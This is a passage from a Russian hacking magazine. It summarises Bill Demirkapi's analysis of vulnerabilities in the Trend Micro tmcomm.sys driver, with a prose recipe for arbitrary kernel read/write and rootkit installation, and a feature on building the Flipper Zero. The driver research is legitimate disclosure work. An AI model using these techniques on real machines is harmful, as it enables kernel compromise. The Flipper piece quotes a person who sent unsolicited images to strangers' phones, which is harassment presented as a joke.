                                    Вызывает NtQueryInformationFile, все  2720h      IoControlQueryFile
                                           параметры определяются запросом

                                    Вызывает NtSetInformationFile, все  2721h       IoControlSetInformationFile
                                           параметры определяются запросом

                                        Создает Oplock с помощью IoCreateFileEx  2722h      IoControlCreateFileOplock
                                           и другого API файловой системы

                                    Вызывает NtCreateFile, а затем ZwQuerySe
  2723h       IoControlGetFileSecurity           curityObject. Все параметры определяются
                                             запросом

                                    Вызывает NtCreateFile, а затем ZwSetSecu
  2724h       IoControlSetFileSecurity           rityObject. Все параметры определяются зап‐
                                        росом

                                       Проверяет дескриптор файла и параметры его  2725h      IoControlQueryExclusiveHandle
                                            использования

  2726h      IoControlCloseExclusiveHandle      Принудитель но закрывает дескриптор файла


IoControlCode == 90004027h
Эта таблица диспетчеризации преимущественно используется для управле‐
ния сканером процессов. Многие функции в ней используют отдельный поток
сканирования для синхронного поиска процессов с помощью различных
методов, как документированных, так и недокументированных. Билл Демир‐
капи также собрал описания основных функций ука занной таблицы.


 Опкод   Фун кция PrimaryRoutine      Описание

                                      Поиск процессов с использованием Zw
  C350h     GetProcessesAllMethods          QuerySystemInformation и WorkingSetEx
                                       pansionLinks

                                           Удаляет резуль таты, полученные с помощью дру‐
  C351h      DeleteTaskResults*                   гих функций, таких как GetProcessesAllMeth
                                       ods

                                      Используется для получения результатов ана‐
  C358h      GetTaskBasicResults*                лиза, выполненного с помощью других функций,
                                                  таких как GetProcessesAllMethods

                                      Используется для получения полных результатов
  C35Dh      GetTaskFullResults*                анализа, выполненного с помощью других фун‐
                                                  кций, таких как GetProcessesAllMethods

                                         Возвращает TRUE, если система «поддерживает ‐
  C360h     IsSupportedSystem                 ся» (независимо от того, имеются ли жестко
                                            заданные смещения для текущего билда)

  C361h     TryToStopTmComm             Пытается остановить драйвер

                                    Выполняет поиск процессов с использованием  C362h     GetProcessesViaMethod
                                            заданного метода

                                       Проверяет device tampering для устройств, свя‐  C371h      CheckDeviceStackIntegrity
                                             занных с физическими дисками

                                         Возвращает TRUE, если для определенных опе ‐
  C375h      ShouldRequireOplock             раций сканирования необходимо использовать
                                          блокировку

Все эти функции исполь зуют несколько структур, которые исследователь наз‐
вал MicroTask и MicroScan. Вот как они выглядят в дизас семблированном
виде.


struct MicroTaskVtable
{
    PVOID Constructor;
    PVOID NewNode;
    PVOID DeleteNode;
    PVOID Insert;
    PVOID InsertAfter;
    PVOID InsertBefore;
    PVOID First;
    PVOID Next;
    PVOID Remove;
    PVOID RemoveHead;
    PVOID RemoveTail;
    PVOID unk2;
    PVOID IsEmpty;
};


struct MicroTask
{
    MicroTaskVtable* vtable;
    PVOID self1; // ptr to itself
    PVOID self2; // ptr to itself
    DWORD_PTR unk1;
    PVOID MemoryAllocator;
    PVOID CurrentListItem;
    PVOID PreviousListItem;
    DWORD ListSize;
    DWORD unk4; // Initialized as NULL
    char ListName[50];
};


struct MicroScanVtable
{
    PVOID Constructor;
    PVOID GetTask;
};


struct MicroScan
{
    MicroScanVtable* vtable;
    DWORD Tag; // Always 'PANS'
    char pad1[4];
    DWORD64 TasksSize;
    MicroTask Tasks[4];
};

Для большинства запросов IOCTL в этой вспомогательной таблице структура
MicroScan заполняется на стороне клиента, который вызывает драйвер.
Именно эту особенность Демиркапи решил использовать для экс плуатации
возможной уязвимости.


                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ
    ОПАСНЫЙ ТРЕНД
              КАК УТИЛИТА TREND MICRO ДЛЯ БОРЬБЫ
         С РУТКИТАМИ ПОЗВОЛИЛА УСТАНАВЛИВАТЬ
                                      РУТКИТЫ





Экспло ит
Билл Демиркапи признается, что во время реверсинга функций, хранящихся
в этой вспомогательной таблице диспетчеризации, он был совершенно сбит
с толку. В итоге оказалось, что ука затель ядра MicroScan, возвращаемый
такими функциями, как GetProcessesAllMethods, напрямую передавался
другим функциям, например DeleteTaskResults, на стороне клиента. Эти
функции принимают такой недоверенный ука затель ядра и практически
без проверки вызывают функции в таблице виртуальных функций, описанной
в классе.





            Вызов функций по полученному указателю

Если внимательно посмотреть на «подпрограмму проверки» функции вспо‐
могательной таблицы диспетчеризации DeleteTaskResults, то можно уви‐
деть, что для экземпляра MicroScan, ука занного во входном буфере + 0x10,
проверка фактически одна: убедиться, что он содержит дей ствительный
адрес в памяти ядра.





                 Проверка экземпляра MicroScan

В DeleteTaskResults исполь зует ся еще одна прос тая проверка.





               Проверка Tag в экземпля ре MicroScan

Далее функция DeleteTaskResults вызывает конструктор, указанный в таб‐
лице виртуальных функций экземпляра MicroScan. Чтобы выз вать таким
образом произволь ную функцию ядра, необходимо выполнить следующие
условия.
 1. Выделить как минимум 10 байт памяти ядра (для vtable и tag).
 2. Управлять выделенной памятью ядра, чтобы установить указатель таблицы
   виртуальных функций и параметр tag.
 3. Научиться определять адрес этой памяти ядра из пользовательского
   режима.

Исследователь пишет, что правиль ное решение в поисках способа выделе‐
ния и управления памятью ядра из пользователь ского режима ему подсказал
его наставник Алекс Ионес ку. В журнале Hack In The Box от 2010 года была
опубликована статья Мэтью Юрчика «Резервные объекты в Windows 7». Идея
статьи заключается в том, что мож но специаль ным образом сформировать
очередь Apc для Apc Reserve Object, а затем исполь зовать NtQuerySystem‐
Information для поиска нужного Apc Reserve Object в памяти ядра. Это поз‐
воляет приложе нию пользовательского режима аллоцировать и контролиро‐
вать до 32 байт в памяти ядра (в 64‐битной среде) и определять рас положе‐
ние этой памяти.
   Такой прием все еще работает в Windows 10, а это означает, что мы
можем соблюсти все требова ния. Используя резервный объект Apc, мы
можем выделить как минимум 10 байт для структуры MicroScan и пол ностью
обойти упомянутые выше проверки. В результате появляется возможность
вызывать произволь ные ука затели ядра.





  Вызов произвольных указателей ядра с использованием резервных объ ‐
  ектов Apc

Билл Демиркапи пришел к выводу, что подоб ная уязвимость характерна
не только для функции DeleteTaskResults, но и для всех функций диспетче‐
ризации, помеченных в таблице звез дочкой. Все они доверяют переданному
клиентом указателю ядра и вызывают конс труктор из таблицы виртуальных
функций экземпляра MicroScan без допол нительных проверок.


IoControlCode == 90004033h
Эта таблица диспетчериза ции управля ет клас сом TrueApi и включает сле‐
дующие функции.


 Опкод   Фун кция PrimaryRoutine      Описание

  EA60h      IoControlGetTrueAPIPointer        Получает указатели функций в классе TrueApi

  EA61h       IoControlGetUtilityAPIPointer       Получает указатели служебных функций драйвера

                                        Регистрирует функцию, которая вызывается  EA62h      IoControlRegisterUnloadNotify*
                                           при выг рузке

                                         Выг ружает ранее зарегистрированную функцию  EA63h      IoControlUnRegisterUnloadNotify
                                              выг рузки

Функция  IoControlRegisterUnloadNotify  привлекла  вни мание  Билла
Демиркапи прежде всего потому, что ее упоминание встречалось в отладоч‐
ных строках. Исполь зуя эту функцию из вспомогательной таблицы диспетче‐
ризации, «недоверенный клиент» может зарегистрировать до 16 произволь‐
ных процедур, которые вызываются при выгрузке драйвера.
  Валидатор данной функции проверяет правиль ность этого указателя
из буфера на стороне клиента. Если вызывающий объект работает в режиме
пользователя, средство проверки вызывает ука затель ProbeForRead. Если
вызывающая сторона находится в режиме ядра, валидатор проверяет, содер‐
жит ли указатель действитель ный адрес памяти ядра.
   Эта функция не может непос редс твенно использоваться в эксплоите
из пользовательского режима. Проблема в том, что, если мы используем
вызов из режима поль зователя, мы дол жны предос тавить указатель поль‐
зовательского режима, пос кольку валидатор использует ProbeForRead.
При  выгрузке  драйвера  вызывается  этот  ука затель  пользовательского
режима, но он мало что делает из‐за огра ничений, накладываемых SMEP —
механизмом защиты страниц памяти. Поз же мы вспомним про эту особен‐
ность.


IoControlCode == 900040DFh
Эта вспомогательная таб лица диспетчериза ции применя ется для взаимодей‐
ствия с Xray API. Хотя Xray API обычно использует ся при сканировании, реали‐
зованном в ядре, функции из этой таб лицы предоставля ют ограниченный
доступ для взаимодействия клиента с физичес кими дисками.


 Опкод   Фун кция PrimaryRoutine      Описание

  15F90h     IoControlReadFile                Читает файл пря мо с дис ка

  15F91h     IoControlUpdateCoreList         Обновляет указатели ядра, используемые Xray API

                                      Получает таблицу дисков, сопоставленных с соот ‐  15F92h     IoControlGetDRxMapTable
                                               ветствующими им устройствами


IoControlCode == 900040E7h
Последняя изученная исследователем таблица дис петче ризации предназна‐
чена для поиска в различных структурах системы хуков, которые могут
использовать различные руткиты. В ней перечис лены проверки, которые
выпол няет ПО Trend Micro для поиска перехвата вызовов функций и прочих
хуков.


 Опкод   Фун кция PrimaryRoutine      Описание

                                       Проверка некоторых системных подпрог рамм  186A0h    TMXMSCheckSystemRoutine
                                            на наличие хуков

                                       Проверка главных функций ввода‐вывода файлов  186A1h    TMXMSCheckSystemFileIO
                                            на наличие хуков

            TMXMSCheckSpecialSys‐         Проверка типа объекта файла и функции  186A2h
             temHooking                    Itoskrnl Io на наличие хуков

            TMXMSCheckGeneralSys‐  186A3h                                Проверка Io Manager на наличие хуков
             temHooking

            TMXMSCheckSystemObjectBy‐     Рекурсивное отсле живание системных объектов  186A4h
          Name                               (каталог или символичес кая ссылка)

            TMXMSCheckSystemObjectBy‐     Копирование системного объекта в память поль‐  186A5h
           Name2*                          зовательского режима

Перед подробным  ана лизом функции TMXMSCheckSystemObjectByName2
Билл Демиркапи приводит дизассемблированный лис тинг нескольких струк‐
тур, используемых этой функцией:


struct CheckSystemObjectParams
{
    PVOID Src;
    PVOID Dst;
    DWORD Size;
    DWORD* OutSize;
};


struct TXMSParams
{
    DWORD OutStatus;
    DWORD HandlerID;
    CHAR unk[0x38];
    CheckSystemObjectParams* CheckParams;
};

Функция TMXMSCheckSystemObjectByName2 при нимает на вход указатель
источника, указатель назначения и размер в байтах. Вызываемый для TMXM‐
SCheckSystemObjectByName2 валидатор про веря ет следующее:
 • ProbeForRead в объ екте CheckParams структуры TXMSParams;
 • ProbeForRead иProbeForWrite в объ екте Dst структуры CheckSyste
  mObjectParams.

По сути это означает, что нам нужно передать действительную структуру
CheckParams, а указатель Dst, который мы передаем, находится в памяти
пользовательско го режима. Теперь пос мотрим на саму функцию.





            Функция TMXMSCheckSystemObjectByName2

Цикл for может показаться пуга ющим, но все, что он содержит, — оптимизи‐
рованный метод проверки диапа зона памяти ядра. Для каждой страницы
памяти в диапазоне от Src до Src + Size функция вызывает MmIsAddress‐
Valid. По‐настояще му страшны следующие операции.


                  Копирование Size в указатель Dst

Эти строки принимают недос товерный указатель Src и копируют бай ты Size
в недостоверный указатель Dst. Мы можем использовать операции memmove
для чтения произволь ного ука зателя ядра, но как насчет записи в произволь‐
ный указатель ядра? Проблема заключа ется в том, что средс тво проверки
TMXMSCheckSystemObjectByName2 требует, что бы местом назначения была
память пользовательского режима. К счастью, Билл Демиркапи обнаружил
в коде еще одну ошибку.
   Строка *params‐>OutSize = Size; берет объ ект Size из нашей струк‐
туры и помещает его в указатель, определяемый OutSize. На что указывает
OutSize, не проверяется, поэтому мы можем записывать в DWORD любой
вызов IOCTL. Одно предос тережение: ука затель Src должен указывать
на действительную память ядра длиной в байтах, соответствующей значению
Size байтов. Чтобы удовлетворить этому требова нию, Демиркапи прос то
передал базу модуля ntoskrnl в качес тве источни ка.
  Используя этот произвольный шаб лон записи, мы можем применить ранее
найденный трюк выгрузки для выполнения про извольного кода. Хотя процеду‐
ра валидации не позволяет нам передавать ука затель ядра, если вызов
выпол няется из пользовательского режима, на самом деле нет никакой необ‐
ходимости проходить через валида тор. Вместо этого с использовани ем
нашего шаблона записи мы можем поместить тот указатель, который мы
хотим, в массив процедуры выгрузки, расположенный внутри секции .data
драйвера.


ОБХОД СЕРТИФИКАЦИИ MICROSOFT WHQL
Пока что мы рассмотрели методы чтения и записи произвольной памяти
ядра, но для установки нашего собственного руткита не хватает одного шага.
Хотя можно выполнить шелл‐код ядра только с использованием примитива
чтения/записи, Билл Демиркапи предложил пой ти по пути наименьшего соп‐
ротивления. Поскольку речь идет о драйвере стороннего производителя, ско‐
рее всего, он использует выделенную память NonPagedPool, которую мы
можем задействовать для раз мещения и выполнения нашего вредоносного
шелл‐кода.
  Давай посмотрим, как Trend Micro рас пределяет память. В самом начале
точки входа драйвера программа проверяет, поддерживается ли система,
определяя версию и номер сборки ОС. Trend Micro делает это потому, что
в программе жестко закодировано несколько смещений, которые отличаются
в разных редакциях Windows.
  К счастью, глобальная переменная PoolType, которая используется
для выделения невыгружаемой памяти NonPagedPool, по умол чанию установ‐
лена в 0. Билл Демир капи заметил, что, хотя изна чально это значение рав‐
нялось 0, переменная все еще находилась в секции .data, то есть ее можно
изменить. Когда исследователь посмотрел на то, что записано в переменной,
он увидел, что функция, отвечающая за проверку версии операционной сис‐
темы,  также в некоторых  случаях  уста навливала значение переменной
PoolType.




               Установка значения перемен ной PoolType

Если на компьютере уста новлена Windows 10 или более новая версия Win‐
dows, драйвер предпочитает использовать NonPagedPoolNx. Хорошо с точки
зрения безопасности, но пло хо для нас. Чтобы использовать уязвимость,
нужно найти запасной элемент ExAllocatePoolWithTag c жестко определен‐
ным аргументом NonPagedPool, ина че мы не смо жем использовать выделен‐
ную память драйвера в Windows 10. Но это не так прос то. Как насчет функции
MysteriousCheck()?





                   Функция MysteriousCheck()

Функция MysteriousCheck() проверя ет, был ли включен Microsoft Driver
Verifier.   Вместо   того   что бы   прос то   использовать   функцию
NonPagedPoolNx, которая работает в Windows 8 и выше, Trend Micro выпол‐
няет явную проверку, что бы использовать только безопасное распределение
памяти.
  Драйвер Trend Micro сертифицирован WHQL, а для получения этого сер‐
тификата  необходима  про верка  драйверов. В  Windows  10  драй веры
не выделяют исполняемую память, это гарантирует Driver Veriﬁer. Компания
Trend Micro решила не обра щать внимания на требования безопасности
и разработала драйвер таким обра зом, чтобы он работал в любой среде тес‐
тирования или отладки, которая обнаружит такие нарушения.





             Драйвер Trend Micro сертифицирован WHQL

Trend Micro мог просто оставить стандартную проверку Windows 10, зачем
вообще создавать явную проверку для Driver Veriﬁer? Единс твенная рабочая
теория, которую и предложил Билл Демиркапи, заключается в том, что
по какой‐то причине большинс тво их драйверов несовместимы с NonPaged‐
PoolNx (совместима толь ко их точка входа), в противном случае подобные
ухищрения теряют всякий смысл.


УСТАНАВЛИВАЕМ СВОЙ РУТКИТ С ПОМОЩЬЮ ROOTKITBUSTER
Итак, как все‐таки можно использовать RootkitBuster для установки в систему
собственного руткита? Для это го нужно выполнить всего лишь три несложных
шага.
 1. Найти любое используемое драйвером рас пределе ние NonPagedPool.
   Пока у тебя не запущен Driver Veriﬁer, можно использовать любые нестра‐
   ничные выделе ния памяти, указатели которых хранятся в секции .data.
   Желательно выбирать распределение, которое используется нечас то.
 2. Напиши  свой  шелл‐код  ядра  в любом месте выделенной  памяти,
   используя произвольный примитив записи ядра TMXMSCheckSystemOb
  jectByName2.
 3. Выполни свой шелл‐код, зарегистрировав про цедуру выгрузки (непос‐
   редственно в секции .data) или используя нес колько других методов,
   представ ленных в таблице диспетчериза ции 90004027h.

Вот, собственно, и все. В своем исследова нии Демиркапи отмечает, что
драйвер tmcomm.sys, раз работанный в Trend Micro, представляет собой кус ки
кода, кое‐как смотанные изолентой. Хотя раз работчики и предусмотре ли
определенные меры защиты, значитель ная часть кода внутри обработчиков
IOCTL использует довольно небезо пасные методы, которые злоумышленники
могут применять отнюдь не в бла гих целях. При этом драйвер tmcomm.sys
используется не толь ко в утилите RootkitBuster, но и в других продуктах Trend
Micro, а значит, потенциальные уязвимости при сутс твуют и в них.
ВЗЛОМ





                                                                       Журнал «Хакер»
                                                                                               xakep@glc.ru

 КИБЕР ДЕЛЬФИН

      КАК СОЗДАВАЛСЯ FLIPPER —
     «ШВЕЙЦАРСКИЙ НОЖ ХАКЕРА»





Хакерство и пентестинг хоть и ассоциируются с сидением
за компьютером, вовсе им не ограничиваются: подобраться
к некоторым устройствам или беспро водным сетям можно
только лично. В такие моменты думаешь: вот бы существо‐
вал  этакий  хакерский мультитул, который будет  всегда
под рукой и позволит работать в полевых условиях! А пока
одни  мечтают,  другие  дела ют  именно  такой  девайс
и   готовятся  произво дить  его  серий но.  Называется
это чудо‐устройство Flipper.


Если для перехвата Wi‐Fi все же быва ют портативные устройства, то работа
с железом в полевых усло виях сейчас выглядит так. Ты берешь с собой ноут‐
бук, подходящую отладочную плату с про шивками на все слу чаи жизни, нес‐
колько антенн, адаптеров, плат рас ширения и внешний аккумулятор для авто‐
номности. И не забудь о целом ворохе проводов, чтобы соединять все
перечисленное. Добавь орга найзер для хранения мелочовки и самодельные
корпуса для защиты хрупких компонентов при передвижении. Знакомо?


             INFO

                 О том, какие инструмен ты пригодят ся при работе
                        с  железом,  читай  в   статье   «Че моданчик
                        хакера 2020».


Павел Жовнер — гик, задрот и богомол (как он представляется в профиле
на «Хабрахабре») — знаком с такой ситу ацией даже слишком хорошо. Орга‐
низуя на питерском ZeroNights 2018 CTF‐конкурс, он с нуля раз работал
подобие вендингового аппарата с кассовым терминалом, который работал
на картах RFID. Проб лему ненадежного крепления плат он тогда решил
радикально: залил тексто лит с компонентами ровным слоем проз рачной
эпоксидной смолы. Это был его первый опыт создания своих гаджетов,
который и раздул страсть к таким самоделкам.


        WWW

                    •Процесс создания считывателя в картинках
                      •Как создавался ящик с NFC





Позже произошло другое важное для истории Flipper событие. ИБ‐иссле‐
дователи обратили свое внимание на про токол Apple для обмена файлами
(AirDrop) и заинтересовались его безопас ностью. Появилась откры тая реали‐
зация под названием OpenDrop, и стало возможно посылать файлы на айфо‐
ны с любого устрой ства, а не только с гаджетов Apple. Дос таточно Raspberry
Pi, чтобы начать рассылать всем прохожим картинки на их айфоны, при усло‐
вии, что они разрешили прием «ото всех».





В интервью «Хакеру» Павел рассказал, как раз влекался с этой возможностью.



     До iOS 13, когда ты слал кар тинку по AirDrop, ее превью показы валось
      на экра не телефона до  того,  как получа тель нажимал «принять»
      или «отклонить». Я сде лал девайс из Raspberry Pi Zero W с батарей-
       кой, который рас сылал такие кар тинки, а моя под руга написа ла бота
      для Telegram @AirTrollBot, чтобы генерировать на лету кар тинку с под-
      писью и нужным соотношением сторон. Час то телефон называ ется
      «Све та iPhone» или «Юля iPhone», этим я и пользовался, обра щаясь
       к вла дельцам устройств по име ни прямо на кар тинке.
       Я прос то сидел в метро и иногда видел сра зу по десять человек.
      Всех бом бил пер сонализированными кар тинка ми. Через эту шту ку я
      поз накомился с кучей людей и ходил на экс пресс‑свиданки по пути
      от метро до работы. Бот может добав лять на кар тинку ник нейм
      в телеграме, и многие догады вались написать мне. Ну а мальчикам
     можно аноним но посылать раз ные приколы. Нап ример, видишь, что
      это телефон Вадима, и шлешь ему «Вадим — лох!». Потом смотришь,
       как он с недоуме нием оглядыва ется по сторонам. Очень весело.

Однако у Raspberry  Pi нет своего дисплея, непонятно, что происходит
на устройстве, голый текстолит платы рвет подкладку карманов, и его очень
легко повредить, а распечатанные на 3D‐принтере корпуса выглядят жал ко,
и пользоваться ими неудобно. Каж дый раз, когда пытаешься собрать что‐то
подходящее из готовых модулей и компонентов, получается бес форменный
«бутерброд» из плат, который раз валива ется от любого чиха.





Тол чок в нужном направлении дал проект pwnagotchi. Этот очаровательный
виртуальный питомец нуждается в рукопожатиях, которые контроллеры бес‐
проводных  сетей  отправляют  на  этапе  соз дания  нового  соеди нения.
В активном режиме сбор пакетов с хешами для клю чей WPA сопровождается
деавторизацией поль зователей и принуди тельным обры вом подключений,
чтобы ускорить процесс. И пусть симпатичная внешность цифрового зверька
тебя не обманет — внутри у него работают нейронные сети на основе крат‐
косрочной памяти и методы глубокого обучения с подкреплением. Все
это помогает устрой ству гибко нас тра ивать оптимальные параметры перех‐
вата и анализа трафика в сети.





Впрочем, Flipper вдох новлен не одними тамагочи. Олдовые товарищи навер‐
няка вспомнят проект персонального коммуника тора Cybiko, который поз‐
волял своим владельцам в начале нулевых годов самостоятельно соз давать
динамические беспроводные сети. А раз личные модули расширения откры‐
вали новые возможности, например вос произведение MP3 и чтение карточек
SmartMedia. Вместе с солидной (по тем временам) биб лиотекой программ
и игр это помогло соз дать вокруг девайса сообщество увлеченных поль‐
зователей.





Так сформировались главные черты будуще го устройства: универсальный
карманный инструмент хакера для исследования бес проводных сетей. Мак‐
симально открытый проект, чтобы каждый мог доработать гаджет под свои
нужды. И симпатичный тамагочи, который бы подарил этой вещи индивиду‐
альность.


ВНЕШНИЙ ВИД
На поиск подходящей формы и проекти рова ние корпуса у команды Flipper
ушло много времени. Во‐первых, было важно создать законченный дизайн,
который бы выгодно выделялся на фоне дру гих хакерских девайсов (некото‐
рые из них доступны лишь в виде голой печатной платы с компонентами).
Во‐вторых, устрой ство должно быть компактным, прочным и одновременно
удобным, чтобы им можно было пользовать ся на ходу.





Наконец, именно в кор пусе предстояло раз местить все внутренние антенны
для беспроводных интерфейсов (о них далее), а также несколько разъ емов.
На деле это оказалось не самой простой задачей: набор доступной перифе‐
рии менялся несколь ко раз, раз меры и форма PCB также претерпели не одну
итерацию. Все это приходилось вся кий раз учитывать и адаптировать соот‐
ветствующим образом сам корпус.





Как ты наверняка уже заметил, у Flipper необычный дизайн. Талис маном про‐
екта  (и персонажем тамаго чи) стал кибердельфин. Это одновре менно
и отсылка к рассказу «Джонни‐мнемоник» Уильяма Гибсона (знаковый автор
жанра киберпанк, если ты не в курсе), и намек на природ ное любопытство
дельфинов и их эхолокатор, который поз воляет с помощью волн воспри‐
нимать  окружающий  мир.  Кстати, именно форма  плавника  (ﬂipper —
это «плавник» на английском) обыграна в изгибах корпуса.
   Кстати, модный внешний вид Flipper — это зас луга ребят из сту дии про‐
мышленного дизайна DesignHeroes, с которыми Павел Жовнер поз накомился
в хакспейсе «Нейрон». У них уже был большой опыт разработки и изготов‐
ления корпусов для электронных устройств из самых разных матери алов.
Именно они помогли с эскизами будущего продукта, 3D‐моделя ми и первыми
напечатанными прототипами.





                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ

     КИБЕРДЕЛЬФИН
                        КАК СОЗДАВАЛСЯ FLIPPER —
                   «ШВЕЙЦАРСКИЙ НОЖ ХАКЕРА»





ЭКРАН
Павел Жовнер считает экран одним из ключевых компонентов будущего
устройства и готов часами рассказывать всем жела ющим о преиму ществах
и недостатках разных технологий. Неуди витель но, что  к выбору экрана
для Flipper он подошел со всей обстоятельностью. Для портативных девай‐
сов, ориентированных на питание от акку мулятора, энергопотребление под‐
светки дисплея очень важно, и если она потребляет слишком много, то
это сильно сократит время автономной работы.
  Наиболее экономичны экраны E  Ink, и в упоминавшемся pwnagotchi
используется как раз такой экран. Увы, у них низкая — порядка секунды —
скорость обновления, и даже банальная навигация по вкладкам в меню спо‐
собна растянуться на долгое время. Если же прибегать  к час тичному
обновлению, без перерисовки всего содержимого кадра, то на экране оста‐
ется видимый след предыду щего изображения  (так называемый image
ghosting).





В результате для Flipper был выбран старый добрый графический ЖКИ‐дис‐
плей с разрешением 128 на 64 точки и диагональю 1,4 дюйма. Монохромное
изображение обладает хорошей контрастностью, так что его видно даже
при ярком солнце на улице, а низкое энергопотребление (около 400 мкА
без подсветки) позволяет  всег да отображать  актуальную информацию
на дисплее.





Конечно, наилучшим вариантом для хакерско го девайса был бы экран по тех‐
нологии Sharp memory, которая поз воляет в режиме ожидания обновлять кар‐
тинку лишь раз в несколько секунд, отправляя остальное устройство целиком
в сон. Само изображение при этом никуда не пропадает. Именно такие дис‐
плеи используются в современных смарт‐часах и фитнес‐браслетах. Однако
у них все еще негуманная стоимость (порядка 20 дол ларов), что никак
не укладывается в бюджет Flipper.


ВЫБОР ПРОЦЕССОРА
Выбор чипа — это определяющий момент, и от него будут зависеть многие
параметры будущего устройства.


Raspberry Pi
Первоначально проект Flipper строился на основе дешевого (10 долларов)
одноплатника Raspberry  Pi Zero W. Выпущенный в 2017 году, этот мик‐
рокомпьютер объединял в себе одно ядерный ARM‐процессор, 512 Мбайт
оперативной памяти, выводы GPIO, USB и бес проводные интерфейсы Wi‐Fi
и Bluetooth. Вокруг этого устройства сформировалось дружное сообщество
любителей и профессионалов. На фоне этих плю сов низ кая производитель‐
ность и проблемы с перег ревом микросхемы казались терпимыми.
  А когда энтузиасты обнаружили способ запускать мониторный режим
с инъекцией пакетов на адаптере Wi‐Fi (пат чи nexmon), то тут уже подклю‐
чились разработчики Kali и объявили об официаль ной поддержке «малинки»
в сво их сборках Linux. В результате общими усилиями получился практически
идеальный инструмент для хакера и пентестера. Не хватало лишь схемы
для аккумулятор ного питания, функции спящего режима и кое‐какой перифе‐
рии для работы с остальными вариантами бес проводной связи.
  По задумке авторов Flipper, за все это должен был отвечать отдельный
малопотребляющий микроконтроллер, который предполагалось объ единить
с центральным процессором RPi. Это позволило бы держать микроконтрол‐
лер постоянно включенным для атак по наиболее простым сценариям, а ЦП
подклю чать уже для действительно серьезных вещей.





Однако позже от «малинки» пришлось отказаться совсем. Выяс нилось, что
ни один из поставщиков Raspberry Pi Zero не готов продавать разом партии
от тысячи штук. Со стороны это выглядит  так: экстремально дешевый
одноплатник про изводится на заводах, рас простра няется между крупными
дистрибьюторами, но «в народ» попада ет лишь по несколько штук в одни
руки. Похоже, «малинка» (или по крайней мере ее бюджетная версия) про‐
дается по цене, близкой к себестоимос ти, и лишь окупает себя и не нап‐
равлена на получение прибыли. Для промышленного и массового примене‐
ния на сайте Raspberry Pi Foundation рекомендуется использовать Compute
Module. Но он и стоит уже совсем других денег — 40 дол ларов.


i.MX6
Когда оказалось, что Raspberry — это не вари ант, в команде Flipper было при‐
нято тяжелое решение делать устрой ство фактически с нуля, на основе
существующе го SoC (System‐on‐Chip). Выбор был ограничен тем, что далеко
не все производите ли готовы работать с небольшой компанией, закупающей
лишь несколько тысяч микросхем.





В результате поисков была подобрана новая основа для Flipper — i.MX6 ULZ.
Это урезанная версия одноядерного процессора Cortex‐A7, без видеояд ра
и некоторых интерфейсов. По производительности они с «малинкой» ока‐
зываются примерно на равных, но i.MX6 значитель но выигрывает в энергоэф‐
фективности.
  К сожалению, найти столь же удачный альтернативный адаптер Wi‐Fi раз‐
работчикам Flipper пока не уда лось. К потенциаль ному кандидату предъ явля‐
ются серьезные требова ния: поддерживать современные стандарты беспро‐
водной сети, уметь работать в диапа зонах 2,4 ГГц и 5 ГГц и допускать разбло‐
кировку монитор ного режима сторонними патчами. И при этом еще быть дос‐
таточно дешевым в крупных партиях (мень ше 10 долларов). Если у тебя есть
подходящий модуль на примете — смело пиши ребятам на форуме.


STM32
Пока аппаратная часть проекта, свя занная с «большими» компонентами —
процессором и адаптером беспроводной свя зи, забуксовала, остальная
часть схемы с обвязкой и микроконтроллером шаг за шагом воплощалась
в коде и железе. Здесь основой стал МК STM32L412 с тактовой час‐
тотой 80 МГц, 128 Кбайт флеша и 40 Кбайт ОЗУ. По сравнению с хорошо
известной серией F4 эти микроконтроллеры появились относительно недав‐
но, но уже завоевали популярность за небольшое энергопотребление
и хороший набор современной периферии.
  В Flipper микроконтрол лер не только реагирует на нажатия кнопок, чтобы
ретранслировать их центральному процессору: именно он взаимодейству ет
с низкоскоростными беспро водными интерфейсами и экраном. Более того,
поселившийся в устрой стве дельфин‐тамагочи тоже работает на микрокон‐
троллере, чтобы всегда быть готовым откликнуться на зов хозяина. Увидев
все это в действии, в команде Flipper решили: а чем это не полноценное
устройство?





Так на свет и появился Flipper Zero.


FLIPPER ZERO
Первым устройством, которое Павел Жовнер и его команда представят миру,
будет именно Flipper Zero — версия Flipper на микроконтрол лере. Вариант
с полноценным компьютером и модулем Wi‐Fi будет называться Flipper One,
и он пока что только в планах.





433 МГц





За беспроводную связь в устройстве отвечает сра зу несколько микросхем.
Одна из них — CC1101 про изводства Texas Instruments поз воляет Flipper
работать на частоте 433 МГц сразу с несколькими типами модуляции: 2FSK,
4FSK, GFSK и MSK. В основном на этой час тоте работают самые примитив‐
ные устройства: датчики, звонки, шлаг баумы и прочее.
  При этом, как правило, используется один из распространенных протоко‐
лов обмена информацией: KeeLoq, Came или DoorHan. Встроенный в Flipper
анализатор подскажет, с чем именно ты имеешь дело в конкретный момент.
И даже если узнать точный протокол не удалось, девайс всегда сможет
как минимум повторить ранее записанный ответ.
  Наконец, как и боль шинс тво тамагочи, Flipper способен общаться с себе
подобными на этой частоте. Ты сможешь играть и взаимодействовать с дру‐
гими владельцами гаджета поб лизос ти.


RFID





Следующий беспровод ной интерфейс ориентирован на карточки дос тупа
с NFC‐антенной, такие как, например, ЕМ‐4100. У них примитивный формат
хранения данных, поэтому с помощью Flipper ты без труда сможешь счи‐
тывать, копировать и эмулировать уже имеющиеся экземпляры. При желании
полученный ID карты можно отпра вить на другой Flipper.

ИК‑порт





В современных гаджетах инфракрасный порт уже не встретишь, однако
в мире до сих пор очень мно го техники, работающей с таким типом сиг‐
нала, — телевизоры, кондиционеры, аудиосистемы. В памяти Flipper содер‐
жатся базовые команды для управления такими устройствами для самых рас‐
пространенных моделей. При этом научить девайс работать со своей тех‐
никой очень просто: дос таточно поднести оригинальный пульт и последова‐
тельно нажать нужные кноп ки. Flipper запомнит новые комбинации и воспро‐
изведет их по твоей команде.


Вы воды GPIO





Для тех, кому по душе более низкоуровневое взаимодействие с железом,
разработчики Flipper вынесли на одну из боковых граней непосредственно
выводы GPIO от мик роконтроллера. Помимо питания и базовых цифровых
сигналов, на них также дос тупна раз нооб разная периферия: ADC, SPI, UART,
I2C, PWM и многое другое. Таким образом, ты сможешь подключать к девайсу
другие компоненты и рас ширить возможности Flipper. Правда, пока непонят‐
но, получит ли развитие концепция плат расширения, как у Arduino или Rasp‐
berry Pi, — все‐таки девайс позиционирует ся как законченное устройство.


USB-C





Изначально у Flipper на осно ве RPi Zero было много разъемов на корпусе:
несколько  USB,  MicroHDMI  и  слот  для  карточки  памяти. В  версии
на STM32 оставили только один USB‐порт для зарядки и перепрограм‐
